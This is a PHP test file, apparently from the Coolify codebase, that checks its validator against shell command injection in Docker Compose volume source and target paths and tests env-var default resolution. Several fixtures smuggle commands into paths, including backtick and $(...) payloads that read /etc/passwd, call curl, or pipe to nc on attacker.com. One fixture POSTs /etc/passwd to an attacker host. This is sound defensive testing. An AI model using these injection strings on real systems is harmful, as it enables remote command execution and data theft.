<?php

use App\Models\LocalFileVolume;
use Symfony\Component\Yaml\Yaml;

test('demonstrates array-format volumes from YAML parsing', function () {
    // This is how Docker Compose long syntax looks in YAML
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: ./data
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['web']['volumes'];

    // Verify this creates an array format
    expect($volumes[0])->toBeArray();
    expect($volumes[0])->toHaveKey('type');
    expect($volumes[0])->toHaveKey('source');
    expect($volumes[0])->toHaveKey('target');
});

test('malicious array-format volume with backtick injection', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/pwn`curl attacker.com`'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['evil']['volumes'];

    // The malicious volume is now an array
    expect($volumes[0])->toBeArray();
    expect($volumes[0]['source'])->toContain('`');

    // When applicationParser or serviceParser processes this,
    // it should throw an exception due to our validation
    $source = $volumes[0]['source'];
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'backtick');
});

test('malicious array-format volume with command substitution', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/pwn$(cat /etc/passwd)'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'command substitution');
});

test('malicious array-format volume with pipe injection', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/file | nc attacker.com 1234'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'pipe');
});

test('malicious array-format volume with semicolon injection', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/file; curl attacker.com'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'separator');
});

test('exact example from security report in array format', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  coolify:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/pwn`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['coolify']['volumes'][0]['source'];

    // This should be caught by validation
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class);
});

test('legitimate array-format volumes are allowed', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: ./data
        target: /app/data
      - type: bind
        source: /var/lib/data
        target: /data
      - type: volume
        source: my-volume
        target: /app/volume
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['web']['volumes'];

    // All these legitimate volumes should pass validation
    foreach ($volumes as $volume) {
        $source = $volume['source'];
        expect(fn () => validateShellSafePath($source, 'volume source'))
            ->not->toThrow(Exception::class);
    }
});

test('array-format with environment variables', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: ${DATA_PATH}
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['web']['volumes'][0]['source'];

    // Simple environment variables should be allowed
    expect($source)->toBe('${DATA_PATH}');
    // Our validation allows simple env var references
    $isSimpleEnvVar = preg_match('/^\$\{[a-zA-Z_][a-zA-Z0-9_]*\}$/', $source);
    expect($isSimpleEnvVar)->toBe(1); // preg_match returns 1 on success, not true
});

test('array-format with safe environment variable default', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: '${DATA_PATH:-./data}'
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['web']['volumes'][0]['source'];

    // Parse correctly extracts the source value
    expect($source)->toBe('${DATA_PATH:-./data}');

    // Safe environment variable with benign default should be allowed
    // The pre-save validation skips env vars with safe defaults
    expect(fn () => validateDockerComposeForInjection($dockerComposeYaml))
        ->not->toThrow(Exception::class);
});

test('array-format with environment variable and path concatenation', function () {
    // This is the reported issue #7127 - ${VAR}/path should be allowed
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: '${VOLUMES_PATH}/mysql'
        target: /var/lib/mysql
      - type: bind
        source: '${DATA_PATH}/config'
        target: /etc/config
      - type: bind
        source: '${VOLUME_PATH}/app_data'
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);

    // Verify all three volumes have the correct source format
    expect($parsed['services']['web']['volumes'][0]['source'])->toBe('${VOLUMES_PATH}/mysql');
    expect($parsed['services']['web']['volumes'][1]['source'])->toBe('${DATA_PATH}/config');
    expect($parsed['services']['web']['volumes'][2]['source'])->toBe('${VOLUME_PATH}/app_data');

    // The validation should allow this - the reported bug was that it was blocked
    expect(fn () => validateDockerComposeForInjection($dockerComposeYaml))
        ->not->toThrow(Exception::class);
});

test('array-format with malicious environment variable default', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '${VAR:-/tmp/evil`whoami`}'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    // This contains backticks and should fail validation
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class);
});

test('mixed string and array format volumes in same compose', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - './safe/data:/app/data'
      - type: bind
        source: ./another/safe/path
        target: /app/other
      - '/tmp/evil`whoami`:/app/evil'
      - type: bind
        source: '/tmp/evil$(id)'
        target: /app/evil2
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['web']['volumes'];

    // String format malicious volume (index 2)
    expect(fn () => parseDockerVolumeString($volumes[2]))
        ->toThrow(Exception::class);

    // Array format malicious volume (index 3)
    $source = $volumes[3]['source'];
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class);

    // Legitimate volumes should work (indexes 0 and 1)
    expect(fn () => parseDockerVolumeString($volumes[0]))
        ->not->toThrow(Exception::class);

    $safeSource = $volumes[1]['source'];
    expect(fn () => validateShellSafePath($safeSource, 'volume source'))
        ->not->toThrow(Exception::class);
});

test('array-format target path injection is also blocked', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: ./data
        target: '/app`whoami`'
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $target = $parsed['services']['evil']['volumes'][0]['target'];

    // Target paths should also be validated
    expect(fn () => validateShellSafePath($target, 'volume target'))
        ->toThrow(Exception::class, 'backtick');
});

// Issue #8854: resolveEnvVarDefault tests — without env vars (backward compat)

test('resolveEnvVarDefault resolves variable with default path', function () {
    $result = resolveEnvVarDefault(str('${CONFIG_FILE:-./default-config.yaml}'));
    expect($result->value())->toBe('./default-config.yaml');
});

test('resolveEnvVarDefault resolves variable with absolute default path', function () {
    $result = resolveEnvVarDefault(str('${DATA_PATH:-/var/lib/data}'));
    expect($result->value())->toBe('/var/lib/data');
});

test('resolveEnvVarDefault returns original string when no default and no env vars', function () {
    $result = resolveEnvVarDefault(str('${DATA_PATH}'));
    expect($result->value())->toBe('${DATA_PATH}');
});

test('resolveEnvVarDefault returns original string when empty default and no env vars', function () {
    $result = resolveEnvVarDefault(str('${DATA_PATH:-}'));
    expect($result->value())->toBe('${DATA_PATH:-}');
});

test('resolveEnvVarDefault keeps non-env-var string unchanged', function () {
    $result = resolveEnvVarDefault(str('./data'));
    expect($result->value())->toBe('./data');
});

test('resolveEnvVarDefault resolved path passes validateShellSafePath', function () {
    $source = str('${CONFIG_FILE:-./default-config.yaml}');
    $resolved = resolveEnvVarDefault($source);

    expect(fn () => validateShellSafePath($resolved->value(), 'storage path'))
        ->not->toThrow(Exception::class);
});

test('resolveEnvVarDefault with malicious default still fails validation', function () {
    $source = str('${VAR:-/tmp/evil`whoami`}');
    $resolved = resolveEnvVarDefault($source);

    expect(fn () => validateShellSafePath($resolved->value(), 'storage path'))
        ->toThrow(Exception::class, 'backtick');
});

// Issue #8854: resolveEnvVarDefault tests — with env vars

test('resolveEnvVarDefault uses env var value when set', function () {
    $envVars = collect(['CONFIG_FILE' => '/custom/config.yaml']);
    $result = resolveEnvVarDefault(str('${CONFIG_FILE:-./default-config.yaml}'), $envVars);
    expect($result->value())->toBe('/custom/config.yaml');
});

test('resolveEnvVarDefault uses env var for simple variable reference', function () {
    $envVars = collect(['DATA_PATH' => '/custom/data']);
    $result = resolveEnvVarDefault(str('${DATA_PATH}'), $envVars);
    expect($result->value())->toBe('/custom/data');
});

test('resolveEnvVarDefault falls back to default when env var not in collection', function () {
    $envVars = collect(['OTHER_VAR' => '/other/path']);
    $result = resolveEnvVarDefault(str('${CONFIG_FILE:-./default-config.yaml}'), $envVars);
    expect($result->value())->toBe('./default-config.yaml');
});

test('resolveEnvVarDefault falls back to default when env var is empty string', function () {
    $envVars = collect(['CONFIG_FILE' => '']);
    $result = resolveEnvVarDefault(str('${CONFIG_FILE:-./default-config.yaml}'), $envVars);
    expect($result->value())->toBe('./default-config.yaml');
});

test('resolveEnvVarDefault returns original string when env var not set and no default', function () {
    $envVars = collect(['OTHER_VAR' => '/other/path']);
    $result = resolveEnvVarDefault(str('${DATA_PATH}'), $envVars);
    expect($result->value())->toBe('${DATA_PATH}');
});

test('resolveEnvVarDefault preview env var overrides normal env var', function () {
    // Simulate merged collection where preview overrides normal
    $normalEnvs = collect(['CONFIG_FILE' => '/normal/config.yaml']);
    $previewEnvs = collect(['CONFIG_FILE' => '/preview/config.yaml']);
    $merged = $normalEnvs->merge($previewEnvs);

    $result = resolveEnvVarDefault(str('${CONFIG_FILE:-./default.yaml}'), $merged);
    expect($result->value())->toBe('/preview/config.yaml');
});

test('resolveEnvVarDefault with malicious env var value still fails validation', function () {
    $envVars = collect(['CONFIG_FILE' => '/tmp/evil`whoami`']);
    $resolved = resolveEnvVarDefault(str('${CONFIG_FILE:-./safe.yaml}'), $envVars);

    // Env var value is used, but it contains backticks so validation catches it
    expect($resolved->value())->toBe('/tmp/evil`whoami`');
    expect(fn () => validateShellSafePath($resolved->value(), 'storage path'))
        ->toThrow(Exception::class, 'backtick');
});

// Issue #8854: LocalFileVolume::resolvedFsPath tests

test('LocalFileVolume resolvedFsPath resolves env var with default path', function () {
    $volume = new LocalFileVolume;
    $volume->fs_path = '${AO_CONFIG_FILE:-./agent-orchestrator.yaml}';

    expect($volume->resolvedFsPath())->toBe('./agent-orchestrator.yaml');
});

test('LocalFileVolume resolvedFsPath passes through normal paths unchanged', function () {
    $volume = new LocalFileVolume;
    $volume->fs_path = '/data/coolify/services/abc123/config.yaml';

    expect($volume->resolvedFsPath())->toBe('/data/coolify/services/abc123/config.yaml');
});

test('LocalFileVolume resolvedFsPath with relative path unchanged', function () {
    $volume = new LocalFileVolume;
    $volume->fs_path = './data/config.yaml';

    expect($volume->resolvedFsPath())->toBe('./data/config.yaml');
});

test('LocalFileVolume resolvedFsPath resolved value passes validateShellSafePath', function () {
    $volume = new LocalFileVolume;
    $volume->fs_path = '${AO_CONFIG_FILE:-./agent-orchestrator.yaml}';

    $resolved = $volume->resolvedFsPath();

    // This should NOT throw — the resolved path is safe
    expect(fn () => validateShellSafePath($resolved, 'storage path'))
        ->not->toThrow(Exception::class);
});

test('LocalFileVolume resolvedFsPath with unresolvable env var throws RuntimeException', function () {
    $volume = new LocalFileVolume;
    $volume->fs_path = '${DATA_PATH}';

    expect(fn () => $volume->resolvedFsPath())
        ->toThrow(RuntimeException::class, 'Cannot resolve storage path');
});

// Regression: bare ${VAR} must NOT be misclassified as a local bind mount
test('bare unresolved env var is not treated as local path by sourceIsLocal', function () {
    $result = resolveEnvVarDefault(str('${DATA_VOLUME}'));
    expect(sourceIsLocal($result))->toBeFalse();
});

test('bare unresolved env var with empty default is not treated as local path', function () {
    $result = resolveEnvVarDefault(str('${DATA_VOLUME:-}'));
    expect(sourceIsLocal($result))->toBeFalse();
});

test('env var with local default IS treated as local path by sourceIsLocal', function () {
    $result = resolveEnvVarDefault(str('${CONFIG_FILE:-./config.yaml}'));
    expect(sourceIsLocal($result))->toBeTrue();
});
